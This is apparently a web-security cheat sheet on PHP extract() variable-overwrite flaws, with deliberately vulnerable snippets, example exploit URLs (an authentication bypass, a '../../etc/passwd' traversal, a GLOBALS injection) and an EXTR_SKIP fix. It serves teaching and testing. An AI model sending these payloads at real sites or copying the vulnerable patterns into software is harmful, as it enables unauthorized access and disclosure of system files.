# External Variable Modification

> External Variable Modification Vulnerability occurs when a web application improperly handles user input, allowing attackers to overwrite internal variables. In PHP, functions like extract($_GET), extract($_POST), or import_request_variables() can be abused if they import user-controlled data into the global scope without proper validation. This can lead to security issues such as unauthorized changes to application logic, privilege escalation, or bypassing security controls.

## Methodology

The `extract()` function in PHP imports variables from an array into the current symbol table. While it may seem convenient, it can introduce serious security risks, especially when handling user-supplied data.

* It allows overwriting existing variables.
* It can lead to **variable pollution**, impacting security mechanisms.
* It can be used as a **gadget** to trigger other vulnerabilities like Remote Code Execution (RCE) and Local File Inclusion (LFI).

By default, `extract()` uses `EXTR_OVERWRITE`, meaning it **replaces existing variables** if they share the same name as keys in the input array.

### Overwriting Critical Variables

If `extract()` is used in a script that relies on specific variables, an attacker can manipulate them.

```php
<?php
    $authenticated = false;
    extract($_GET);
    if ($authenticated) {
        echo "Access granted!";
    } else {
        echo "Access denied!";
    }
?>
```

**Exploitation:**

In this example, the use of `extract($_GET)` allow an attacker to set the `$authenticated` variable to `true`:

```ps1
http://example.com/vuln.php?authenticated=true
http://example.com/vuln.php?authenticated=1
```

### Poisoning File Inclusion

If `extract()` is combined with file inclusion, attackers can control file paths.

```php
<?php
    $page = "config.php";
    extract($_GET);
    include "$page";
?>
```

**Exploitation:**

```ps1
http://example.com/vuln.php?page=../../etc/passwd
```

### Global Variable Injection

:warning: As of PHP 8.1.0, write access to the entire `$GLOBALS` array is no longer supported.

Overwriting `$GLOBALS` when an application calls `extract` function on untrusted value:

```php
extract($_GET);
```

An attacker can manipulate **global variables**:

```ps1
http://example.com/vuln.php?GLOBALS[admin]=1
```

## Remediations

Use `EXTR_SKIP` to prevent overwriting:

```php
extract($_GET, EXTR_SKIP);
```
